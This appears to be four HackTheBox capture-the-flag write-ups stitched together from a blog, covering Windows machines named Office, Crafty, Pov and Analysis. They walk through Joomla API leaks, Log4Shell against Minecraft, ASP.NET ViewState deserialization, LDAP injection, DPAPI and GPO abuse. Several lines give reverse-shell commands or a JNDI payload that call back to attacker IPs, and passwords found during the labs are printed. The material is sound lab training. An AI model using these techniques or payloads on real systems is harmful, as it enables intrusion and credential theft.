Difficulty Rating:
Release Date : 17 Feb 2024
OS : Windows
Base Points : Hard [40]
Nmap scan:
Host is up (0.088s latency).
Not shown: 65515 filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49669/tcp open  unknown
49922/tcp open  unknown
65181/tcp open  unknown
65186/tcp open  unknown
65216/tcp open  unknownCategory: Recon
nmap finds many open TCP ports, looking like a Windows domain controller:
There a ton here. Notes:
Given the use of domain names, I’ll try fuzzing for subdomains of office.htb that respond differently. The brute force went really slowly, so I’ll kill that and add that to my later enumeration if I’m stuck.  I’ll add what I have to my /etc/hosts:
Enumeration to do list:
netexec confirms the host and domain:
I’m not able to do any unauth enumeration:
The site is a blog about Iron Man and holigrams:
The posts are written by and signed by “Tony Stark”, the CEO of the company. There’s not much else interesting on the page.
nmap identified the site as Joomla, a free and open-source PHP-based content management system (CMS). There’s a lot of ways to identify this. It’s in the HTML at the top of the main page:
The robots.txt file points that way as well:
/administratoris the default relative path for the administrative login. I can get the exact Joomla version at /administrator/manifests/files/joomla.xml:
I know that Joomla is PHP based, and the main site does load as index.php.
I’ll skip the directory brute force because I know it’s Joomla and therefore I know it’s structure.
As nmap reported, the HTTPS site just returns 403:
Running feroxbuster against this actually finds something interesting:
I’m using a lowercase wordlist since Windows is typically case-insensitive, and going without recursion as traversing into /joomla finds a ton of stuff. /joomla seems to be the same site as TCP 80’s root.

Category: Auth as dwolfe
Searching for “Joomla 4.27 exploit” returns a ton of pages about CVE-2023-23752 (most of which are older than Office):
NIST describes this rather vaguely:
An issue was discovered in Joomla! 4.0.0 through 4.2.7. An improper access check allows unauthorized access to webservice endpoints.
I’ve exploited this vulnerability before in DevVortex, and have a detailed explanation of the vulnerability here, and there’s a nice blog post from VulnCheck as well. The short version is that what is basically a mass-assignment vulnerability allows an attacker to add ?public=true to some private API endpoints and run them unauthenticated. There are many ways to use this. In DevVortex, I leaked usernames and config files that included  a password, and used those to log into the admin panel.
There are lots of exploit scripts for this one, but it’s just as easy to show manually. For example, visiting /api/index.php/v1/config/application returns 403 forbidden:
With ?public=true, there’s a bunch of data:
From this I’ll get the SQL connection information, user root with password “H0lOgrams4reTakIng0Ver754!”.
/api/index.php/v1/users is another common endpoint to check, but there’s only one user:
This password doesn’t work as administrator for Office, and it doesn’t work as administrator or root on the Joomla admin login.
Now that I have a password to try, getting a list of users becomes much more important. I’ll use kerbrute in userenum mode to check for valid users:
The full list takes 25 minutes, but most of the names come out in the first minute or so.
I’ll use those users to make a list, and netexec to check the password with each of them:
There’s a hit on dwolfe. No matches on WinRM:

Category: RCE as web_account
With a valid credential, I gain access to SMB shares:
SOC Analysis jumps out as non-standard and therefore most interesting. It contains a single PCAP file:
I’ll grab it.
I’ll open the PCAP in Wireshark and start with Statistics –> Endpoints. There are 16 IPv4 endpoints:
Seems likely that 10.250.0.0/24 is the internal network. The most traffic is from .30. Looking at the TCP numbers, there’s 443 (HTTPS) traffic with all the public IPs. Other than that, .30 has traffic to 88 (Kerberos), 135 (NetBios), and 445 (SMB). The rest of the traffic is high ports from .30 and .41. It seems .30 is the DC, though it’s not clear what all this high port traffic coming out of .30 would be.
Looking at Statistics –> Conversations shows that all of the traffic where .30 is acting as the client is HTTPS traffic outbound. The traffic from .41 is to services on .30:
I’m especially interested in how .41 is authenticating, which is likely the port 88 Kerberos. If I add a Wireshark filter for ip.addr==10.250.0.41, there’s only 83 packets (out of almost 2000) to investigate.
There are two AS-REQ requests from the client:
This is the request from a client to the DC to get a certificate to authenticate to another service (watch this amazing video for a full explanation of Kerberos). Interestingly, neither of them seems to be successful. Still, the client has signed this request using the user’s NTLM hash, which means it could be susceptible to brute force attacks.
The first doesn’t have any authentication data, but the second AS-REP packet does:
This packet includes a timestamp encrypted by the tstart user.
VSScrub has a really nice post on just this challenge back from 2020. The quick version is that I can create a Hashcat hash from this cipher field knowing that it fits the same encryption type:
With rockyou.txt it cracks in 12 seconds on my host:
This password does work for the tstark user for SMB, but not for WinRM:
Unfortunately, this access doesn’t show anything new in SMB shares.
This password with the username administrator does work to log into Joomla:
In DevVortex I showed both modifying a template and creating a plugin. I’ll go for the template modification this time.
I’ll click on System and select “Site Templates”, and then “Cassiopeia Details and Files”. I’ll edit index.php, and after making a change in a comment to make sure I have permissions (I do), I’ll add a simple webshell that if the cmd parameter is set, it just calls system and returns, and otherwise the page is the same:
It works:
This does get reset every few minutes, so I’ll just keep the edit page open, and reclick “Save” any time I need the webshell back.

Category: Shell as TStark
Rather than get a shell as web_account, I’m going to skip directly to tstark. I’ll host RunasCs on my Python webserver, and download it to programdata:
There are hits on my Python webserver as well:
The webshell shows r.exe is there as well:
I’ll send ?cmd=C:\programdata\r.exe tstark playboy69 cmd.exe -r 10.10.14.5:443, and I get a shell:
I’ll upgrade to PowerShell:
And grab user.txt:

Category: Shell as PPotts
TStark is a member of the “Registry Editors” group:
That’s a custom group for Office, but it seems to imply that TStark can edit at least parts of the registry.
There are six home directories on this host:
That matches up with the accounts on the box:
I’ve already owned web_account and tstark, both of which has basically empty home directories.
The webserver here is Xampp, homed out of xampp in the root of C:
There’s nothing else too interesting in the root.
The webroots would be stored in C:\xampp\htdocs, which interestingly has three directories:
There’s nothing new in the joomla dir, as I’ve already leaked the DB connection creds.
The administrator directory has a single log file at administrator\logs\1.error.php, and it’s not interesting.
internal seems to be another website:
In C:\xampp\apache\conf\httpd.conf, I’ll find the setup of the virtual host for this site:
The applications directory is empty, but it is owned by the PPotts user, and web_account has access to write to it:
One other useful bit of enumeration is understanding the programs installed on Office.
It’s worth noting that LibreOffice is installed, where as there’s no sign of Microsoft Office.
I’ll upload a copy of Chisel to Office:
And start the server on my host. Now I’ll connect back:
It hangs, and there’s a connection at my host:
Now accessible at http://127.0.0.1:8083 on my host, I’ll check out the site, which is for some kind of holographic technologies:
This page is the index.html file observed above, and there’s a link to /resume.php as “Submit Application”. This page is a form:
If I upload a file with a blocked extension, it shows an error:
If I create a text file but name it test.odt, it uploads:
More than half of resume.php is static HTML making up the form, but there’s PHP right at the top to handle POST requests:
This is doing some file renaming, and validating that the extension is one of docm, docx, doc, or odt. Then it saves it under an new name to the applications folder (that is owned by PPotts).
Uploading a valid file does show up in applications:
After a few minutes, it’s gone.
There are a couple ways to execute the next step:
CVE-2023-2255 abuses a “Floating Frame” (similar to an IFrame in HTML) to fetch and display objects within a document. Because these objects can be OLE objects, this can lead to remote code execution.
There’s a simple POC exploit from elweth-sec that takes --cmd and --output arguments and generates a ODT file.
I’ll start with a simple ping to make sure this works:
I’ll upload it and make sure it’s there:
After a minute or two, I get ICMP packets:
I’ll grab a PowerShell #3 Bash64 reverse shell from revshells.com and create an ODT:
I’ll upload it via the form, and after a few minutes I get a shell as PPotts:
I can create a document with an auto open macro and try to run that, but the macro’s won’t run in the default state. This wiki page documents the MacroSecurityLevel registry key that shows the current settings:
Based on this page, the value of 3 is currently set on Very High. The ACLs on this key show that the “Registry Editors” group has FullControl:
I’ll update it:
It works! It’s worth noting that when I check back in a few minutes the value has reset back to 3.
I’ll open LibreOffice Writer and a new document, add a macro, and have it run my reverse shell:
Under “Tools” –> “Customize”, I’ll assign the macro to Open Document:
I’ll upload this document and wait again. When it processes, I get a reverse shell:

Category: Shell as HHogan
cmdkey /list will show if there are any saved credentials on the current account:
The one for HHogan is certainly of interest. They are in the Remote Management Users group, which means if I can recover this credential I can likely connect over WinRM:
They are also a “GPO Manager”, which will be a escalation vector.
The system level credentials are stored by DPAPI here:
The master keys for these is stored here:
I’ve shown the case of decrypting a DPAPI master key before in Access. The challenge is that the master key is encrypted with the user’s password, and I don’t have it. Fortunately, there’s a blog post from SpecterOps that shows how to decrypt without the password, using an RPC called MS-BKRP (BackupKey Remote Protocol). To abuse this I’ll use the /rpc flag in Mimikatz.
I’ll upload a copy of mimikatz.exe and run it. From my flimsy shell, I’ll want to run the commands all at once by passing them in, giving the path to the master key as well as the /rpc flag:
The key is at the bottom, “87eedae4c65e0db…[snip]…”.
I don’t know which of the three encrypted creds are the one I’m looking for, so I’ll just do all three. I need to pass in the directory as well as the masterkey from above. The first one is the “MyUser” cred, and doesn’t return anything useful:
The third one errors out:
The second returns the plaintext creds for HHogan:
The creds are good for SMB and WinRM:
I’ll use Evil-WinRM to get a shell:
I already noted above that HHogan is a member of the “GPO Managers” group:
There are a handful of GPOs here:
I’m going to assume that means that HHogan can edit GPOs. GPOs, or Group Policy Objects, are policies that Windows uses to manage computers at scale. It can control basically anything about a Windows computer.
There’s a really nice tool from FSecureLabs called SharpGPOAbuse designed to abuse GPOs. It offers the following:
I’ll host a copy on my Python webserver and upload it:
The first GPO isn’t writable:
But the second one I try works:
This doesn’t take effect until the GPO refreshes. HHogan has permissions to run gpupdate /force which will make that happen now:
Now HHogan is in the administrator’s group:
It won’t show in my current session, but on exiting and reconnecting:
And I can read root.txt:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 10 Feb 2024
OS : Windows
Base Points : Easy [20]
Creators : TheCyberGeekfelamos
Nmap scan:
Host is up (0.11s latency).
Not shown: 65533 filtered ports
PORT      STATE SERVICE
80/tcp    open  http
25565/tcp open  minecraftCategory: Recon
nmap finds two open TCP ports, HTTP (80) and Minecraft (25565):
Based on the IIS version, the host is running modern Windows. I’ll note the redirect to crafty.htb on 80. I’ll use ffuf to scan for other subdomains that respond differently but not find anything. I’ll add crafty.htb to my /etc/hosts file:
The page is a Minecraft page:
The text does show a subdomain, play.crafty.htb, which I’ll add to my /etc/hosts file. Visiting it in a browser just redirects to crafty.htb.
All three of the image in the middle are links, but they all go to /coming-soon:
The HTTP response headers show IIS but not much else:
Trying to guess at extensions, when I go to /index.html, it returns a 301 redirect to /home:
index.html must exist or be specifically defined, because /0xdf.html returns the standard IIS 404 page. It’s not important to solve the box, but I’ll look at how the webserver is serving the static pages and redirects in Beyond Root.
I’ll run feroxbuster against the site using a lowercase wordlist since it’s Windows and case-insensitive:
Nothing interesting.
It’s worth a note that if I ever accidentally start feroxbuster with the default list and notice that different casings are showing up in the results, it’s worthwhile to kill it and start over, or else it will spend a bunch of time recursing down the same directory multiple times.
Typically with an unknown port I’ll try interacting via curl and nc to see if it replies at all. curl returns an error message that is common when the service is not expecting HTTP:
Connecting with ncdoes connection, and then nothing. I can enter text, but it doesn’t respond, until I Ctrl-c to kill the session.
I did note that nmap got a version string from the server. I’ll start Wireshark and run nmap -p 25565 -sCV 10.10.11.249 to scan it again. The interesting TCP stream is the third of three:
I’ll switch the view from ASCII to Hex Dump:
I can recreate this with nc:
But not much else I can identify manually.

Category: Shell as svc_minecraft
Log4Shell is one of the most serious vulnerabilities discovered to date. It is a vulnerability in a common Java logging library, Log4J, that results in remote code execution. Minecraft is a well known service that was vulnerable to Log4Shell.
This post on help.minecraft.net talks about how Log4Shell impacts Minecraft. Specifically, for version 1.12-1.16.5, the startup command line must be modified to patch it, or upgrade to 1.17.
I’ve shown Log4Shell exploitation of Minecraft before, for Hackvent 2023 Day 19. I’ve shown other exploitations of Log4Shell in Holiday Hack 2021 and on LogForge.
To exploit Log4Shell on Minecraft, I need to send a specific message to the commands / chat function. To interact with the Minecraft server, I’ll need a client.
I could download a full Minecraft client, but that costs money. There are many free clients on GitHub! I’ll use Minecraft-Console-Client, downloading the latest release.
I’ll run it, giving a username. It asks for a password (I’ll entry blank), and then a server, where I can put in Crafty:
The documentation has a list of commands, all starting with /. If I start typing one, the auto-complete will come up:
Commands like /dig aren’t enabled yet:
I can list bots (/bots) or players (/list), though both return empty:
To send a chat, I’ll just send something not starting with /, and it displays back:
Once in a while I can be killed:
/respawn and I’m back:
The issue with Log4Shell is that the Log4J logging module doesn’t handle well the pattern ${[stuff]}. By putting a JNDI/LDAP url in that pattern, it will cause the logger to fetch data from an arbitrary server and, if that is serialized Java, that leads to execution.
To test for this, I’ll send listen on TCP port 389 (LDAP default) with nc and then enter a payload that will attempt to contact my host on 389:
If there’s a connection to my host, then the server is likely vulnerable to Log4Shell. On sending, I get a connection:
I had good luck with this POC during Hackvent, so I’ll use it again. I’ll clone the repo to my computer and install the dependencies:
There’s also instructions on the repo for downloading a specific Java binary from this page. I’ll download jdk-8u20-linux-x64.tar.gz from he bottom of that page, and extract it:
I’ll run the exploit, giving it my IP, a web port to listen on, and the port I want a shell back on:
It gives me this ${jndi:ldap://10.10.14.6:1389/a} payload, which I can send to Minecraft (and when I do it :
There’s requests at the exploit server:
But no shell connection at nc.
The poc.py script starts off with a generate_payload function that starts defining a template Java program on lines 15-54:
It puts in the IP and port, writes it to disk, and then compiles it with javac.
Looking at the payload, it’s using String cmd="/bin/sh";, which won’t work on a Windows host. I’ll edit that to String cmd="cmd.exe";.
Running the updated exploit, I’ll send the payload to Minecraft. This time there’s only on hit at the exploit:
And a shell at nc:
I like to use rlwrap to get things similar to the shell upgrade on Linux.
The user flag is on the desktop:
I’ll also switch to PowerShell:

Category: Shell as Administrator
The website code lives in C:\inetpub. The web root is wwwroot, which has three files as well as directories:
There’s nothing interesting as far as escalating privileges. It’s just a static site, as expected. This web.config file is nice to look at to understand the behavior noted above, which I’ll look at in Beyond Root.
There’s only the administrator user who has a home directory on this box besides svc_minecraft:
The Public folder is empty:
The Minecraft server is homed in svc_minecraft’s home directory in the server folder:
I suspect that server.jar is a Minecraft server. I’ll take a file hash:
Searching on VT I’ll find this:
There’s one positive hit, but only that it has a vulnerable version of Log4J. It’s been on VT since 2021:
The names show it’s likely a real Minecraft server. The Community tab agress:
The plugins directory has a single Jar:
I’ll hash it:
And find it on VT. It’s first submission was in February 2024, the day after Crafty released!
That’s a good sign this is something custom to Crafty.
To get a copy of this Jar file on my host, I’ll start an SMB server with Impacket’s smbserver.py:
A username and password are required for most Windows hosts to connect. I’ll mount the share on Crafty:
Now I can copy the binary to my machine:
I’ll verify the hash matches:
I’ll grab a copy of JD-GIU and open the plugin with java -jar jd-gui-1.6.6.jar playercounter-1.0-SNAPSHOT.jar.
The project is pretty small:
rkon is a public library for the Source RCON Protocol, designed for game servers. From the docs:
The Source RCON Protocol is a TCP/IP-based communication protocol used by Source Dedicated Server, which allows console commands to be issued to the server via a “remote console”, or RCON. The most common use of RCON is to allow server owners to control their game servers without direct access to the machine the server is running on. In order for commands to be accepted, the connection must first be authenticated using the server’s RCON password, which can be set using the console variable rcon_password.
plungin.yml has some basic metadata:
The Playercounter.class file has the main part of the plugin:
It’s connecting to rkon on port 27015 with the password “s67u84zKq8IXw”. In theory this is updating a playercount.txt in the web directory, though that file doesn’t actually exist on Crafty.
Without access to SMB, LDAP, WinRM, Kerberos, or any other authenticated Window services, I don’t have a good way to check this password from my host. I’ll upload a copy of RunasCs by downloading a copy from the releases and hosting it on my Python web server. Then, from a directory svc_minecraft can write to (I like to stage out of C:\programdata), I can request it from Crafty:
The basic syntax is RunasCs.exe <username> <password> <cmd>. With a bad password, it fails:
But with the password from the plugin it works:
RunasCs has a -r option that takes an IP and port to connect stdin, stdout, and stderr of the resulting process to, which works very much like a reverse shell. With nc listening on TCP 443, I’ll run it:
At my listening nc, there’s a shell as Administrator:
I’ll switch to PowerShell:
And grab the flag:
I noted above that there was interesting behavior around the index.html file on the webserver. Visiting that resulted in a redirect to /home Visiting other files that didn’t exist returned an IIS 404.
The only other file I could locate on the webserver is /coming-soon.
The web.config file is where this is all configured. The file is structured as XML data with a series of “rewrite” rules:
When I show the rules here, I’m removing whitespace from the front to make it easier to read on this page.
The first rule is looking for requests for exactly index.html:
If it is a POST, it doesn’t match (though I’m not sure why, as the site doesn’t take POST requests). The action is to redirect to /home, and then on matching it stops processing rules. That explains the redirect to /home.
For fun, I’ll find my GET request for /index.html in Burp’s Proxy history and send the request to Repeater. Then I’ll right click and change the request method to POST. On sending, the server returns 405 Method Not Allowed:
The next rule goes with the first:
It’s matching on /home. The conditions look at if the request matches a file or directory. So if there were a file or directory named home, then it would match. And since both has negate="true", this rule only applies where there isn’t a file or directory named home. On a match, it “rewrites” the url to serve index.html.
The coming-soon page has two similar rules. The first redirects requests for /coming-soon.html to  /coming-soon:
The second rewrites requests to /coming-soon to return coming-soon.html:
The last rule is called “Redirect to domain”:
It matches on any url, except the condition looks at the {HTTP_HOST}, which is the Host header in the request. That regex is using a negative lookahead to say that any pattern that does not start with crafty.htb will match. Said differently, if the Host header doesn’t start with “crafty.htb”, then this rule will match and redirect to http://crafty.htb.
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 27 Jan 2024
OS : Windows
Base Points : Medium [30]
Nmap scan:
Host is up (0.093s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE
80/tcp open  httpCategory: Recon
nmap finds only a single open TCP port, HTTP (80):
Based on the IIS version the host is running a modern Windows OS.
The title of the page is pov.htb.
Given the reference to the domain name, I’ll use ffuf to brute force for any subdomains of pov.htb that return something different from the default page:
Almost immediately it finds dev.pov.htb. I’ll add both of these to my /etc/hosts file that I can interact with these domains:
The site is for a cybersecurity monitoring service:
All of the links on the page go nowhere. The “Contact Us” form doesn’t even submit the input data, so that’s just a placeholder.
There is an email address on the page, sfitz@pov.htb.
The HTTP response headers show both IIS and ASP.NET:
This suggests I could see .aspx pages if there’s any dynamic content.
The main page loads as index.html, suggesting it’s a static page.
The 404 page is a standard IIS 404.
I’ll run feroxbuster against the site, and include -x aspx since I know the site is using ASP.NET, and with a lowercase wordlist since the server is IIS:
Nothing interesting here.
The site root redirects to /portfolio, which is a portfolio for a web developer:
There’s a reference to ASP.NET in bold in the intro paragraph:
One testimonial says that the he’s good, but not great in ASP.NET security:
All the links except one go to places on the same page. The “Download CV” link calls JavaScript __doPostBack('download', ''):
Clicking the button downloads and opens a PDF in a new tab:
The response headers here show it’s also powered by ASP.NET:
I’ll take a guess at file extensions, but my bad guesses return 302 redirects to default.aspx, which matches ASP.NET.
I’ll run feroxbuster against the site, and include -x aspx since I know the site is using ASP.NET, and with a lowercase wordlist since the server is IIS:
There’s a bunch of redirects that go to /portfolio, but feroxbuster doesn’t find that path on its own. Nothing else looks very interesting. I’ll run again there as well:
There’s the default.aspx I identified by guessing, as well as contact.aspx.
This is a bad looking Contact form (almost looks like a mobile site):
Submitting to this form does send the data, though there’s no sign that anything is done with it. If I get stuck, I can try blind XSS here, but I won’t need to.

Category: Shell as sfitz
I’ll find the request that is sent when I click “Download CV” in Burp and send it to Repeater (I also like to clear out some unneeded HTTP headers in the request):
There’s a few interesting things here:
Given that the request is asking for a file, I’ll try asking for other files as well. I know there’s a default.aspx, and I can read it:
default.aspx is almost entirely static HTML, but there is the include at the top that brings in C# code. I can read index.aspx.cs as well:
This is the code that does the file read. It is replacing ../ with an empty string, but otherwise it will read basically any file path.
I wasn’t able to get system-wide file read working with relative paths (even with bypasses like ....//), but using absolute paths worked fine:
It’s not clear to me why ..\..\..\Windows\System32\drivers\etc\hosts doesn’t work. Relative paths within the directory do work (as I’ll see shortly). I think that’s because the application is rooted one directory above the current one, and IIS isn’t letting relative paths go outside of it.
The ViewState configuration is set in the site’s web.config file. There is no web.config in the current (portfolio) directory, but there is one up one level:
The same file returns from \webconfig:
I believe this is not a web.config file sitting in the root of the C: drive, but rather reflects that the root of the application is one directory up from the current one.
The full XML file is:
I’ll use ysoserial.net with the following options:
This’ll generate a base64-encoded blob:
With tcpdump listening for ICMP traffic, I’ll update the __VIEWSTATE POST parameter in Burp Repeater and send:
It returns immediately. At tcpdump:
That’s remote code execution (RCE)!
I’ll grab a reverse shell from revshells.com, PowerShell #3 (Base64), and update my YSoSerial.NET command, replacing the ping with the reverse shell:
On updating my __VIEWSTATE and submitting the request, there’s a shell at nc:

Category: Shell as alaading
whoami /all gives a ton of information about sfitz:
It’s interesting that the user is in an IIS APPPOOL group, but doesn’t have SeImpersonatePrivilege. Nothing exciting here.
There are a few user home directories on Pov:
The interesting ones are alaading and Administrator.
sfitz’s Desktop is empty, but there’s a file in Documents:
It is a PSCredential file for alaading:
The PowerShell credential is encrypted with key material on the box it was generated on. That means I can’t exfil it and decrypt it on my machine without a bunch of extra work.
Instead, I’ll use the Import-CliXml PowerShell commandlet to read the file and get the plaintext password:
I’ll download a copy of RunasCs.exe and host it with a Python webserver on my host. Then I can upload it to Pov:
I’ll run it:
At listening nc:
I’ll switch to PowerShell:

Category: Shell as Administrator
alaading has the SeDebugPrivilege enabled:
Interesting, before I switched to PowerShell from cmd, it was there, but disabled:
This 2008 blog post on devblogs.microsoft.com has the title “If you grant somebody SeDebugPrivilege, you gave away the farm”. Basically, because a user with that privilege can debug any process (including those running as system), they can inject code into those processes and run whatever they want as that user.
I’ll show two ways to abuse this privilege:
One of the coolest features of Meterpreter is that it allows migrating from one process into another. Typically, this can only be done in processes running as the same user, unless Meterpreter is running as an administrator or System. However, the SeDebugPrivilege is enough to allow this as well.
I’ll start by making a payload to get a Meterpreter shell on Pov:
This makes rev.exe. I’ll serve it with Python and upload it to programdata.
I’ll start msf-console and use the exploit/multi/handler exploit, setting the payload, lhost, and lport:
Now I’ll run it:
On Pov, I’ll run rev.exe:
At Metasploit:
I need the PID of a process running as SYSTEM, like winlogon.exe:
Now I’ll just migrate into it:
And I’m system:
I can drop to a shell and get root.txt:
The HackTricks section on SeDebugPrivilege links to three exploits that will get a shell as system:
The last one is a PowerShell script, and therefore seems like the easiest place to start.
I’ll host it with a Python webserver and upload it and import it to my current session:
I need the PID of a process running as System (548 for winlogon.exe from above should be fine). According to documentation, I should be able to run something like:
Error 122 is ERROR_INSUFFICIENT_BUFFER, “The data area passed to a system call is too small.”. Shoutout to Deus who pointed out that I can also check this error code with certutil:
So does that mean my command is too long? I can try a shorter one:
Same error, and no ICMP packets at my host. Some testing and playing around with this with IppSec suggests that it’s something about the shell process I have here.
I’ll upload Chisel to the box and use it to create a tunnel from 5985 on my host to 5985 on Pov. Then I can connect over Evil-WinRM:
From here, the same command as above outputs nothing:
But this time I get a shell at nc:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 20 Jan 2024
OS : Windows
Base Points : Hard [40]
Nmap scan:
Host is up (0.095s latency).
Not shown: 65507 closed ports
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3306/tcp  open  mysql
5985/tcp  open  wsman
9389/tcp  open  adws
33060/tcp open  mysqlx
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49674/tcp open  unknown
49675/tcp open  unknown
49678/tcp open  unknown
49679/tcp open  unknown
49694/tcp open  unknown
49709/tcp open  unknownCategory: Recon
nmap finds many open TCP ports:
It’s clearly a Windows box, and based on the combination of Kerberos (TCP 88), DNS (TCP 53), and LDAP (TCP 389, others), it’s likely a domain controller.
The domain analysis.htb is returned from the LDAP enumeration scripts.
I’ll check the MySQL port real quick, but my IP is not authorized:
Triaging where to go from here:
netexec gives a hostname and confirms the domain name:
Given the hostname of DC-ANALYSIS, it is likely a domain controller.
There’s no unauthenticated access to the SMB shares:
I’ll try brute forcing for subdomains on the HTTP server using ffuf:
It quickly identifies the internal.analysis.htb domain, which is returning 403. I’ll add it along with the domain to my /etc/hosts file:
Visiting the site by IP address returns a 404 error:
This is a default IIS 404 page.
Visiting analysis.htb gives a website for some kind of cybersecurity firm:
None of the links on the page go anywhere else.
Interestingly, nmap showed headers of Microsoft HTTPAPI httpd 2.0, but the response headers I see show IIS:
That matches the 404 page identified above.
The page loads as index.html, suggesting a static site. The 404 page here is a different but also standard IIS 404 page:
I’ll run feroxbuster against the site, using a lowercase wordlist since IIS is case-insensitive and I won’t want to recurse into directories multiple times:
/bat/ is the most interesting thing here, but it returns 403 forbidden, and brute forcing inside it didn’t find anything.
As ffuf pointed out, this site is returning an IIS 403 Forbidden:
I’ll run feroxbuster here as well. To get what I need to continue, I need to guess that the site is running on PHP, or use a wordlist that has files with extensions in it. I think this is pretty poor design for a HTB machine, but it is something that can happen in the real world. I’ll use -x php:
There’s a bunch of potentially interesting paths in there, and I’ll specifically want to check out the ones that returned 200:
All of the dashboard paths return an empty page.
/employees/login.php presents a login form:
There’s also an /dashboard/uploads directory. Nothing was identified in it, but something to keep in mind.
/users/list.php returns a message:
Fuzzing for parameters with ffuf shows a different response when ?name= is sent:
Trying that in Firefox, it returns an empty table:

Category: Shell as svc_web
When the name parameter is blank, it returns this single row with a username of “CONTACT_”. This is weird. My first thought is to try name=b, as “b” isn’t in “CONTACT_”, but it returns the same thing. When I try name=b*, it changes:
It looks like “*” is being used as a wildcard.
It’s also worth noting that the column headers in the table line up very nicely with standard LDAP fields.
The “*” as wildcard is classic LDAP injection. The LDAP query probably looks something like &(sAMAccountName=$_GET['name']). If that’s the case, then I can try to inject into it. I already showed b* worked to get “badam”. “b*m” works as well:
Interestingly, “b*a*” works, but “b**” does not:
The last name field is “sn” for sirname, and I can inject to query for that as well:
From my envisioned query above, that would make:
I’m going to write a Python script for this, using httpx and asyncio to make it go fast. It is probably enough to just run 26 times and look for names starting with each letter, but I’ll be thorough and check all possible combinations.
My main function is as follows:
It will create an httpx client and a queue to hold tasks. I’ll start the queue with each lowercase letter. Then I create a bunch of worker tasks, each of which is a call to the worker function, passing in the queue, an empty list for the results, and the client.
await queue.join() will wait until all the items in the queue have had task_done() called, and there are no unfinished tasks left.
Then I’ll add a None to the queue for each worker. This is a signal to the worker function that it can return so they aren’t just left hanging.
await asyncio.gather(*workers) waits for the tasks to all return. The results are then printed. Because the list is passed by reference in Python, and I’m only appending to it, it’s a safe way to share between tasks. I’ll go a more complex route in the next script.
The worker function handles items from the queue until it gets a None:
It starts as an infinite loop, getting an item from the queue. If that’s None, it marks the task done and break the loop, returning. Then it calls test_str, which has three possible returns:
If the result is True (there’s an exact match), then it adds the string to the results. If it is not None (so True or False, it was a partial match, so it adds tasks to the queue for all the next possible letters. Then it marks this task done and loops.
test_str uses the client to query the webserver:
The first time it appends a wildcard, and if there’s no match, it returns None. If it matches with a wildcard, it tries without the wildcare, and returns accordingly.
The final script is:
That script runs in less than five seconds, sending almost 900 requests, and identifies five users:
Now I’ll write another script to read field values. The strategy changes slightly here. Now I’m going to specify a username and then get the value from a field. That means there’s only one right answer. I also have a bigger alphabet, including lower, upper, digits, and special characters. I’m going to remove () from the list, as that just breaks the injection (hopefully I don’t need it).
I’ll start with a bit of setup to take in a username and a field to target:
main looks very similar to the previous, with a few changes:
Rather than a list, I’m keeping the result in a Result class. It’s just a simple class with a single attribute:
Having just a string will fail when accessed by multiple workers, but this works fine. It loads the queue with all the possible first characters, as the first time through the loop temp_value is empty. It creates workers, and waits for them to empty the queue, and uses None in the queue to exit, just like above.
But rather than be done, I have to account for the possibility that I’m not done, but rather I hit a “*” in the value. I’ll save the potential solution as temp_value, and loop again, adding in “*” and then all possible next characters. This allows me to continue testing. If i find something, it was a start, and value.value will be different from temp_value when it gets back. If not, then it breaks the loop and prints the result.
worker has an extra check as well:
At the top, it checks that the string about to be checked starts with the current longest known starting string. If I know the string starts “abd”, there’s no point in checking “abc” that might have been added to the queue.
When checking matches, I make this check again, as result.value could have updated while awaiting the network call.
test_str is the same.
The final code is:
This runs pretty fast, brute forcing badam’s sn in less than three seconds:
It is not uncommon to store the password for an account, especially a shared account, in the description field in LDAP. This was part of the intended path of the Support machine I authored. technician sounds like a shared account, and there’s something password-like in the description field:
It does have a “*” in the result, making that hacky work-around necessary.
That password works for SMB:
Unfortunately it doesn’t work for WinRM:
There’s also nothing of interest on the SMB shares:
Entering “technician@analysis.htb” and “97NTtl*4QP96Bv” at the /employees/login.php page does work:
The main page of the dashboard mentions a ticket system and a SOC security report system:
There are some chats, but they aren’t clickable and don’t show anything interesting.
The tickets page has five tickets:
Viewing a ticket in detail shows the “Details” field:
There is one reference to HTA files:
This page offers an upload form:
If I upload a simple image file, it shows the same form with an “File is safe.” message, implying that it was analyzed or even run:
Interestingly, that file is now available in /dashboard/uploads:
That path is also given in the response to the upload:
This panel offers a way to send email to employees:
Entering an email and some text and sending pops a message:
I could test this for XSS, but I don’t need to.
There are two ways to get execution from this webpage:
I’ve already identified that uploaded files go to /dashboard/uploads, and that this site is PHP. I’ll make a simple PHP webshell:
I’ll upload this via the SOC reports, and find it in Firefox:
That’s execution. I’ll grab a “Powershell #3 (Base64)” webshell from revshells.com and make it the command:
It hangs, but at nc:
Given the reference to HTA files in the tickets, I can try uploading an HTA file. I don’t think this is very well hinted at, which is why everyone I know of took the PHP webshell route.
I’ll create an HTA that runs VBScript code, which just creates a shell object to call a PowerShell webshell:
When I upload it, there’s a shell at nc:

Category: Shell as jdoe
There are a bunch of users on this box:
Only a handful that have home directories:
I’m not able to access any but Public, and there’s nothing interesting there.
I’ll show two ways to find the password for jdoe:
A common thing to look for on Windows machines is credentials stored in the registry for auto-logon. Enumeration scripts like WinPEAS will identify these as well. They are easily read with PowerShell:
In the dashboard directory, there are files that I hadn’t identified in enumerating the site:
The Yara rules are likely run against files to see if they are malicious. alert_panel.php is new.
There’s a lot of HTML here, but the PHP parts are interesting:
It’s checking for username and password fields in the GET parameters. This is a good way to take creds, because they end up in web logs.
